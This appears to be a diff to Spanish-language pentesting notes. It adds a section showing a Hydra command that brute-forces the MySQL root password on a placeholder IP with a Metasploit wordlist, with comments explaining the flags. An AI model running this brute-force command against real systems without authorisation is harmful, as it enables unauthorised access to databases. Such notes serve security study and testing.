@@ -79,3 +79,12 @@ Esto se usa en el panel del admin de WordPress.
 	# P = Ruta o archivo que contiene las passwd
 	# l = Un usuario en especifico
 ```
+
+## Hydra fuerza bruta MYSQL
+
+```python
+❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <IP> mysql
+
+	# P = Ruta o archivo que contiene las passwd
+	# l = Un usuario en especifico
+```
